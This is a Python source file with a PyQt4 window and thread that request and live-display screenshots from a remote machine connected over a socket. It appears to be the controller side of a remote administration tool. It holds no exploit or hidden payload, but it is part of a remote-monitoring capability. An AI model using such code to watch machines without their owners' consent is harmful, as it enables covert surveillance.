from PyQt4.QtGui import *
from PyQt4.QtCore import *

import threading
import socket
import Image
import zlib
import os
import string
import random
from datetime import datetime
from ast import literal_eval

from main_ui import Ui_Form

from libs.modechat import get

def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']
        self.tmp = args['tempPath']
        self.always_top()

        self.setWindowTitle('Desktop Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))

        self.startStreamingButton.clicked.connect(self.start_desktop)
        self.stopStreamingButton.clicked.connect(self.stop_desktop)
        self.alwaysTopButton.clicked.connect(self.always_top)

    def start_desktop(self):
        self.desktop = DesktopStreaming(self.sock)
        self.desktop.start()
        # Create a QTimer
        self.timer = QTimer()
        self.timer.setSingleShot(False)
        self.timer.timeout.connect(self.set_screenshot)
        self.timer.start(0.1)

    def set_screenshot(self):
        try:
            self.screenshotLabel.setPixmap(QPixmap.fromImage(self.desktop.screen_bits).scaled(
                QSize(self.screenshotLabel.width(), self.screenshotLabel.height())))
        except AttributeError:
            pass

    def stop_desktop(self):
        try:
            self.desktop.active = False
        except AttributeError:
            pass
        self.timer.stop()

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

    def closeEvent(self, event):
        try:
            self.desktop.active = False
        except AttributeError:
            pass
        self.stop_desktop()

class DesktopStreaming(threading.Thread):
    def __init__(self, sock):
        super(DesktopStreaming, self).__init__()

        self.sock = sock
        self.active = True

    def run(self):
        while self.active:
            try:
                data = get(self.sock, 'getScreenshot', 'screenshotget')
                result = literal_eval(data)
                im = Image.frombuffer('RGB', (int(result['width']), int(result['height'])),
                                      zlib.decompress(result['screenshotbits']), 'raw', 'BGRX', 0, 1)
                data = im.convert('RGBA').tostring("raw", "RGBA")
                self.screen_bits = QImage(data, im.size[0], im.size[1], QImage.Format_ARGB32_Premultiplied)
                #try:
                    #os.remove(self.path_to_preview)
                #except:
                    #pass
            except ValueError:
                pass
            except socket.error:
                break
